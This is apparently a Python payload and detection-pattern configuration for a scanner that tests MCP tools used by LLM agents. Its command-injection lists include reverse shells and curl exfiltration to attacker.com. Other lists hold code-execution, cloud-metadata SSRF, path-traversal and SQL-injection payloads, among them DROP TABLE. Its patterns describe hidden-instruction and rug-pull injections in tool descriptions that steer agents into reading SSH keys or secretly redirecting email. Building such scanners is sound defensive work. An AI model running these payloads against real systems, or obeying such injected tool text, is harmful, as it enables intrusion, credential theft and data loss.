"""配置文件：MCP 工具安全检测载荷


MCP 工具安全风险分类:
1. 工具描述注入 (Tool Description Injection) - 恶意工具描述诱导 LLM 执行危险操作
2. Rug Pull 攻击 - 工具行为在多次调用后改变
3. 敏感信息泄露 - 工具返回或要求敏感数据
4. 命令/代码执行 - 工具允许执行任意命令或代码
5. SSRF - 工具允许访问内部资源
6. 过度授权 - 工具权限超出必要范围
7. 过度数据暴露 - 返回超出预期的大量数据
"""

# ============================================================
# MCP 工具安全检测载荷
# ============================================================

MCP_INJECTION_PAYLOADS = {
    # ---------------------------------------------------------
    # MCP-01: 工具描述注入检测
    # 检测工具描述中是否包含恶意指令
    # ---------------------------------------------------------
    "mcp_tool_description_injection": [
        # 检测隐藏指令标签
        "<IMPORTANT>",
        "</IMPORTANT>",
        "<!-- ",
        " -->",
        "Do not mention",
        "do not tell the user",
        "secretly",
        "without user knowing",
        
        # 检测敏感文件读取指令
        "read ~/.cursor/mcp.json",
        "read ~/.ssh/id_rsa",
        "read /etc/passwd",
        "read config file",
        "pass its content as",
        
        # 检测行为劫持指令
        "must send all emails to",
        "redirect to",
        "forward to",
        "actual recipient will be extracted",
    ],
    
    # ---------------------------------------------------------
    # MCP-02: 命令注入 - 测试工具是否执行系统命令
    # ---------------------------------------------------------
    "mcp_command_injection": [
        # 基础命令注入
        "; cat /etc/passwd",
        "| ls -la",
        "`whoami`",
        "$(id)",
        "&& cat /etc/passwd",
        "|| cat /etc/passwd",
        
        # 反弹 shell
        "; curl http://attacker.com/$(whoami)",
        "| nc attacker.com 4444 -e /bin/sh",
        "; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
        
        # Windows 命令
        "& dir",
        "| type C:\\Windows\\System32\\config\\SAM",
    ],
    
    # ---------------------------------------------------------
    # MCP-03: 代码执行 - 测试 eval/exec 类工具
    # ---------------------------------------------------------
    "mcp_code_execution": [
        # Python 代码执行
        "__import__('os').system('whoami')",
        "exec('import os; os.system(\"id\")')",
        "eval('__import__(\"os\").popen(\"whoami\").read()')",
        
        # 文件操作
        "open('/etc/passwd').read()",
        "__import__('subprocess').check_output(['cat', '/etc/passwd'])",
        
        # 网络请求
        "__import__('requests').get('http://attacker.com')",
        "__import__('urllib.request').urlopen('http://attacker.com').read()",
    ],
    
    # ---------------------------------------------------------
    # MCP-04: SSRF - 测试工具是否允许访问内部资源
    # ---------------------------------------------------------
    "mcp_ssrf": [
        # 内网 IP
        "http://127.0.0.1",
        "http://localhost",
        "http://0.0.0.0",
        "http://192.168.1.1",
        "http://10.0.0.1",
        "http://172.16.0.1",
        
        # 云元数据服务
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        
        # 协议绕过
        "file:///etc/passwd",
        "dict://localhost:6379/info",
        "gopher://localhost:6379/_INFO",
        
        # DNS 重绑定
        "http://localtest.me",
        "http://127.0.0.1.nip.io",
    ],
    
    # ---------------------------------------------------------
    # MCP-05: 路径遍历 - 测试文件操作工具
    # ---------------------------------------------------------
    "mcp_path_traversal": [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc/passwd",
        "/etc/passwd%00.jpg",
        "....//....//....//etc/shadow",
    ],
    
    # ---------------------------------------------------------
    # MCP-06: SQL 注入
    # ---------------------------------------------------------
    "mcp_sql_injection": [
        "' OR '1'='1",
        "1' UNION SELECT * FROM information_schema.tables --",
        "admin'--",
        "1; SELECT * FROM users WHERE '1'='1",
        "' OR 1=1--",
        "'; EXEC xp_cmdshell('whoami'); --",
    ],
    
    # ---------------------------------------------------------
    # MCP-07: 敏感信息探测
    # ---------------------------------------------------------
    "mcp_sensitive_info_probe": [
        # 凭证关键词
        "password",
        "secret",
        "api_key",
        "token",
        "credential",
        "private_key",
        "connection_string",
        
        # 配置文件路径
        "/.env",
        "/config.json",
        "/application.yml",
        "/settings.py",
        "/.git/config",
        
        # 系统文件
        "/etc/passwd",
        "/etc/shadow",
        "/proc/self/environ",
    ],
    
    # ---------------------------------------------------------
    # MCP-08: 资源标识符注入 (internal:// 等)
    # ---------------------------------------------------------
    "mcp_resource_injection": [
        "internal://credentials",
        "system://config",
        "admin://settings",
        "secret://keys",
        "config://database",
        "env://variables",
    ],
    
    # ---------------------------------------------------------
    # MCP-09: 过度数据暴露测试 - 测试是否返回大量数据
    # ---------------------------------------------------------
    "mcp_excessive_data_exposure": [
        # 空查询/通配符查询
        "",
        "*",
        "%",
        ".*",
        "all",
        "全部",
        # 大范围查询
        "1=1",
        "true",
        # 无限制分页
        '{"page": 1, "size": 99999}',
        '{"limit": 999999}',
        '{"offset": 0, "limit": -1}',
    ],
    
    # ---------------------------------------------------------
    # MCP-10: 越权访问测试 (IDOR) - 测试是否能访问他人数据
    # ---------------------------------------------------------
    "mcp_idor": [
        # 用户ID遍历
        "1",
        "0",
        "admin",
        "zhangw",
        "liuy",
        "longj",
        "guest",
        # 常见员工工号格式
        "80000002",
        "90000002",
        "00000008",
        # UUID 测试
        "00000000-0000-0000-0000-000000000000",
        # 负数/边界值
        "-1",
        "999999999",
    ],
    
    # ---------------------------------------------------------
    # MCP-11: 敏感业务数据探测 - HR/财务等敏感信息
    # ---------------------------------------------------------
    "mcp_sensitive_business_probe": [
        # HR 相关查询
        "salary",
        "薪资",
        "工资",
        "绩效",
        "考勤",
        "员工",
        "人事",
        # 财务相关
        "财务",
        "报销",
        "账户",
        "银行卡",
        "合同",
        "成本",
        # 个人信息
        "身份证",
        "手机号",
        "地址",
        "邮箱",
    ],
}

# ============================================================
# MCP 工具描述安全检测模式
# 用于检测工具描述中的恶意内容
# ============================================================

TOOL_DESCRIPTION_RISK_PATTERNS = {
    "hidden_instruction": [
        "<IMPORTANT>",
        "</IMPORTANT>",
        "<!--",
        "-->",
        "[hidden",
        "secretly",
        "do not mention",
        "do not tell",
        "without user knowing",
        "implementation detail",
    ],
    
    "sensitive_file_access": [
        "~/.cursor/",
        "~/.ssh/",
        "~/.aws/",
        "~/.config/",
        "/etc/passwd",
        "/etc/shadow",
        "mcp.json",
        "id_rsa",
        "credentials",
        "config file",
    ],
    
    "behavior_hijacking": [
        "must send",
        "redirect to",
        "forward to",
        "actual recipient",
        "side effect",
        "when this tool is available",
        "application will crash",
        "data will be lost",
    ],
    
    "rug_pull_indicator": [
        "has been upgraded",
        "enhanced",
        "before providing",
        "you must first",
        "access the system",
        "include the API keys",
        "present the information as if",
    ],
}

# ============================================================
# 敏感信息检测模式 - 分级检测
# HIGH_CONFIDENCE: 高可信度，直接判定为漏洞
# MEDIUM_CONFIDENCE: 中可信度，需要上下文验证
# ============================================================

# 高可信度敏感模式 - 这些模式出现即表示存在真实的敏感信息泄露
SENSITIVE_PATTERNS_HIGH_CONFIDENCE = [
    # 系统文件内容（命令执行成功的明确标志）
    "root:x:0:0:", "daemon:x:1:1:", "bin:x:2:2:",  # /etc/passwd 内容
    "/bin/bash", "/bin/sh", "/usr/sbin/nologin",
    "uid=0(root)", "uid=", "gid=", "groups=",
    
    # 私钥泄露（高危）
    "-----BEGIN RSA PRIVATE", "-----BEGIN PRIVATE KEY",
    "-----BEGIN OPENSSH PRIVATE", "ssh-rsa AAAA",
    "-----BEGIN EC PRIVATE",
    
    # 数据库连接字符串（包含实际凭据）
    "mongodb://", "mysql://", "postgres://", "redis://",
    "jdbc:mysql://", "jdbc:postgresql://",
    
    # 云服务凭证
    "AKIA",  # AWS Access Key ID 前缀
    "sk-",   # OpenAI API Key 前缀
    "169.254.169.254",  # 云元数据服务
    "iam/security-credentials",
    
    # 命令执行成功的明确标志
    "drwxr-xr-x", "drwx------", "-rw-r--r--",  # ls -la 输出
    "total ",  # ls 输出
    
    # 内部资源标识
    "internal://", "system://", "admin://",
    "SYSTEM CREDENTIALS", "Admin Username", "Admin Password",
]

# 中可信度敏感模式 - 需要结合上下文判断
SENSITIVE_PATTERNS_MEDIUM_CONFIDENCE = [
    # SQL 注入成功标志（需要验证不是正常错误）
    "information_schema", "table_name", "column_name",
    "UNION SELECT", "ORDER BY",
    
    # 配置信息泄露
    "connection_string", "connectionString",
    "AWS_ACCESS_KEY", "AWS_SECRET_KEY",
    "AZURE_", "GCP_PROJECT",
]

# 合并为兼容旧代码的列表（仅包含高可信度）
SENSITIVE_PATTERNS = SENSITIVE_PATTERNS_HIGH_CONFIDENCE

# ============================================================
# 敏感业务数据检测模式 (HR/财务/个人信息)
# ============================================================

SENSITIVE_BUSINESS_PATTERNS = {
    # HR 敏感数据
    "hr_data": [
        "salary", "薪资", "工资", "薪酬", "年薪", "月薪",
        "绩效", "考核", "评级", "奖金", "提成",
        "考勤", "请假", "加班", "出勤",
        "入职", "离职", "转正", "试用期",
        "社保", "公积金", "五险一金",
    ],
    
    # 财务敏感数据
    "finance_data": [
        "银行账号", "银行卡", "账户余额", "转账",
        "报销", "发票", "费用", "预算",
        "成本", "利润", "营收", "收入",
        "合同金额", "付款", "收款",
    ],
    
    # 个人隐私数据 (PII)
    "pii_data": [
        "身份证", "idcard", "id_card", "证件号",
        "手机号", "电话", "phone", "mobile",
        "家庭住址", "地址", "address",
        "邮箱", "email",
        "出生日期", "birthday", "生日",
        "籍贯", "民族", "婚姻",
    ],
    
    # 组织敏感数据
    "org_data": [
        "组织架构", "部门", "汇报关系",
        "职级", "职位", "岗位",
        "权限", "角色", "admin",
    ],
}

# ============================================================
# 攻击类型描述
# ============================================================

ATTACK_DESCRIPTIONS = {
    "mcp_tool_description_injection": "MCP工具描述注入：检测工具描述中是否包含恶意隐藏指令",
    "mcp_command_injection": "MCP命令注入：测试工具是否允许执行系统命令",
    "mcp_code_execution": "MCP代码执行：测试工具是否允许执行任意代码",
    "mcp_ssrf": "MCP-SSRF：测试工具是否允许访问内部资源或云元数据",
    "mcp_path_traversal": "MCP路径遍历：测试文件操作工具的路径验证",
    "mcp_sql_injection": "MCP-SQL注入：测试数据库查询工具的输入过滤",
    "mcp_sensitive_info_probe": "MCP敏感信息探测：测试工具是否返回敏感数据",
    "mcp_resource_injection": "MCP资源注入：测试工具是否允许访问内部资源标识符",
}

# 合并所有载荷
INJECTION_PAYLOADS = MCP_INJECTION_PAYLOADS

# ============================================================
# MCP 安全分类
# ============================================================

OWASP_MCP_CATEGORIES = {
    "Tool_Description_Injection": ["mcp_tool_description_injection"],
    "Command_Injection": ["mcp_command_injection"],
    "Code_Execution": ["mcp_code_execution"],
    "SSRF": ["mcp_ssrf"],
    "Path_Traversal": ["mcp_path_traversal"],
    "SQL_Injection": ["mcp_sql_injection"],
    "Info_Disclosure": ["mcp_sensitive_info_probe"],
    "Resource_Injection": ["mcp_resource_injection"],
}

# ============================================================
# 危险工具名称模式 (基于 testcase1.py)
# ============================================================

DANGEROUS_TOOL_PATTERNS = [
    "execute_code",
    "execute_command",
    "eval",
    "exec",
    "run_code",
    "run_command",
    "shell",
    "system",
    "subprocess",
]

# ============================================================
# 危险资源模式
# ============================================================

DANGEROUS_RESOURCE_PATTERNS = [
    "internal://",
    "system://",
    "admin://",
    "secret://",
    "config://",
    "credentials",
]

# ============================================================
# 硬编码凭据检测模式
# 用于检测工具 inputSchema 中的硬编码敏感信息
# ============================================================

HARDCODED_CREDENTIAL_PATTERNS = {
    # Authorization 头
    "authorization_header": [
        "Basic ",      # Basic Auth (Base64 编码)
        "Bearer ",     # Bearer Token
        "Token ",      # Token Auth
        "ApiKey ",     # API Key
        "AWS4-HMAC-",  # AWS Signature
    ],
    
    # API Key 模式
    "api_key_patterns": [
        r"sk-[a-zA-Z0-9]{20,}",           # OpenAI API Key
        r"api[_-]?key[\"']?\s*[:=]\s*[\"']?[a-zA-Z0-9]{16,}",
        r"apikey-[a-zA-Z0-9]{16,}",       # 通用 API Key
        r"key-[a-zA-Z0-9]{16,}",
    ],
    
    # 密码/密钥模式
    "secret_patterns": [
        r"password[\"']?\s*[:=]\s*[\"']?[^\s\"']{4,}",
        r"secret[\"']?\s*[:=]\s*[\"']?[^\s\"']{4,}",
        r"token[\"']?\s*[:=]\s*[\"']?[a-zA-Z0-9]{16,}",
        r"private[_-]?key",
    ],
    
    # Base64 编码的凭据（长度 > 20 的 Base64 字符串）
    "base64_credentials": [
        r"[A-Za-z0-9+/]{20,}={0,2}",  # Base64 pattern
    ],
}

# 敏感参数名称（在 inputSchema 中检测）
SENSITIVE_PARAM_NAMES = [
    "authorization",
    "auth",
    "authkey",
    "auth_key",
    "auth-key",
    "token",
    "accesstoken",
    "access_token",
    "api_key",
    "apikey",
    "api-key",
    "password",
    "passwd",
    "pwd",
    "secret",
    "secretkey",
    "secret_key",
    "credential",
    "private_key",
    "access_key",
    "appkey",
    "app_key",
    "appid",
    "app_id",
    "clientsecret",
    "client_secret",
]

# 硬编码凭据的严重程度
HARDCODED_SEVERITY = {
    "authorization_header": "HIGH",
    "api_key_patterns": "HIGH", 
    "secret_patterns": "CRITICAL",
    "base64_credentials": "MEDIUM",
}


# ============================================================
# 工具类型识别和动态 Payload 生成策略
# ============================================================

# 工具类型识别规则 - 基于工具名称和描述关键词
TOOL_TYPE_PATTERNS = {
    # 查询类工具 - 优先测试数据暴露和 IDOR
    "query": {
        "name_patterns": ["query", "search", "find", "get", "list", "fetch", "select", "查询", "搜索", "获取"],
        "desc_patterns": ["查询", "搜索", "获取", "列表", "query", "search", "find", "retrieve"],
        "recommended_attacks": ["mcp_excessive_data_exposure", "mcp_idor", "mcp_sql_injection", "mcp_sensitive_business_probe"],
        "priority_payloads": {
            "mcp_excessive_data_exposure": ["", "*", "%", "all"],
            "mcp_idor": ["1", "admin", "0", "-1"],
            "mcp_sql_injection": ["' OR '1'='1", "1' UNION SELECT * FROM information_schema.tables --"],
        }
    },
    
    # 执行类工具 - 优先测试命令注入和代码执行
    "execute": {
        "name_patterns": ["execute", "exec", "run", "eval", "shell", "command", "cmd", "执行", "运行"],
        "desc_patterns": ["执行", "运行", "命令", "脚本", "execute", "run", "command", "script"],
        "recommended_attacks": ["mcp_command_injection", "mcp_code_execution"],
        "priority_payloads": {
            "mcp_command_injection": ["; cat /etc/passwd", "| whoami", "`id`", "$(whoami)"],
            "mcp_code_execution": ["__import__('os').system('id')", "exec('import os; print(os.getcwd())')"],
        }
    },
    
    # 文件操作类工具 - 优先测试路径遍历
    "file": {
        "name_patterns": ["file", "read", "write", "upload", "download", "path", "文件", "读取", "写入", "上传", "下载"],
        "desc_patterns": ["文件", "读取", "写入", "上传", "下载", "路径", "file", "read", "write", "path"],
        "recommended_attacks": ["mcp_path_traversal", "mcp_sensitive_info_probe"],
        "priority_payloads": {
            "mcp_path_traversal": ["../../../etc/passwd", "....//....//etc/passwd", "/etc/passwd"],
            "mcp_sensitive_info_probe": ["/.env", "/config.json", "~/.ssh/id_rsa"],
        }
    },
    
    # 网络请求类工具 - 优先测试 SSRF
    "network": {
        "name_patterns": ["http", "request", "fetch", "url", "api", "call", "网络", "请求", "调用"],
        "desc_patterns": ["请求", "调用", "URL", "API", "HTTP", "网络", "request", "fetch", "call"],
        "recommended_attacks": ["mcp_ssrf", "mcp_resource_injection"],
        "priority_payloads": {
            "mcp_ssrf": ["http://127.0.0.1", "http://169.254.169.254/latest/meta-data/", "file:///etc/passwd"],
            "mcp_resource_injection": ["internal://credentials", "system://config"],
        }
    },
    
    # 数据库类工具 - 优先测试 SQL 注入
    "database": {
        "name_patterns": ["sql", "db", "database", "table", "数据库", "表"],
        "desc_patterns": ["数据库", "SQL", "表", "记录", "database", "table", "record"],
        "recommended_attacks": ["mcp_sql_injection", "mcp_excessive_data_exposure"],
        "priority_payloads": {
            "mcp_sql_injection": ["' OR '1'='1", "'; DROP TABLE users; --", "1 UNION SELECT * FROM users"],
            "mcp_excessive_data_exposure": ["", "1=1", "*"],
        }
    },
    
    # 用户/员工类工具 - 优先测试 IDOR 和敏感数据
    "user": {
        "name_patterns": ["user", "employee", "staff", "member", "person", "用户", "员工", "人员"],
        "desc_patterns": ["用户", "员工", "人员", "成员", "user", "employee", "staff", "person"],
        "recommended_attacks": ["mcp_idor", "mcp_sensitive_business_probe", "mcp_excessive_data_exposure"],
        "priority_payloads": {
            "mcp_idor": ["1", "admin", "root", "0", "guest"],
            "mcp_sensitive_business_probe": ["salary", "薪资", "身份证", "手机号"],
        }
    },
    
    # 默认类型 - 通用测试
    "default": {
        "name_patterns": [],
        "desc_patterns": [],
        "recommended_attacks": ["mcp_excessive_data_exposure", "mcp_sensitive_business_probe", "mcp_idor"],
        "priority_payloads": {
            "mcp_excessive_data_exposure": ["", "*"],
            "mcp_sensitive_business_probe": ["salary", "员工"],
            "mcp_idor": ["1", "admin"],
        }
    }
}

# 参数类型对应的 payload 策略
PARAM_TYPE_PAYLOADS = {
    # ID 类参数 - 测试 IDOR
    "id_params": {
        "patterns": ["id", "userid", "user_id", "employeeid", "employee_id", "uid", "工号"],
        "payloads": ["1", "0", "admin", "-1", "999999", "00000000-0000-0000-0000-000000000000"],
        "attack_type": "mcp_idor"
    },
    
    # 查询类参数 - 测试 SQL 注入和数据暴露
    "query_params": {
        "patterns": ["query", "search", "keyword", "filter", "where", "条件", "关键字"],
        "payloads": ["", "*", "' OR '1'='1", "%"],
        "attack_type": "mcp_sql_injection"
    },
    
    # 路径类参数 - 测试路径遍历
    "path_params": {
        "patterns": ["path", "file", "filename", "filepath", "dir", "directory", "路径", "文件"],
        "payloads": ["../../../etc/passwd", "/etc/passwd", "....//....//etc/passwd"],
        "attack_type": "mcp_path_traversal"
    },
    
    # URL 类参数 - 测试 SSRF
    "url_params": {
        "patterns": ["url", "uri", "link", "endpoint", "target", "地址", "链接"],
        "payloads": ["http://127.0.0.1", "http://169.254.169.254/latest/meta-data/", "file:///etc/passwd"],
        "attack_type": "mcp_ssrf"
    },
    
    # 命令类参数 - 测试命令注入
    "command_params": {
        "patterns": ["cmd", "command", "exec", "shell", "script", "命令", "脚本"],
        "payloads": ["; cat /etc/passwd", "| whoami", "`id`"],
        "attack_type": "mcp_command_injection"
    },
    
    # 代码类参数 - 测试代码执行
    "code_params": {
        "patterns": ["code", "expression", "eval", "script", "代码", "表达式"],
        "payloads": ["__import__('os').system('id')", "exec('import os')"],
        "attack_type": "mcp_code_execution"
    },
}

# 攻击类型的默认严重程度
ATTACK_TYPE_SEVERITY = {
    "mcp_command_injection": "CRITICAL",
    "mcp_code_execution": "CRITICAL",
    "mcp_sql_injection": "HIGH",
    "mcp_ssrf": "HIGH",
    "mcp_path_traversal": "HIGH",
    "mcp_idor": "HIGH",
    "mcp_excessive_data_exposure": "MEDIUM",
    "mcp_sensitive_business_probe": "MEDIUM",
    "mcp_sensitive_info_probe": "MEDIUM",
    "mcp_resource_injection": "MEDIUM",
    "mcp_tool_description_injection": "HIGH",
}
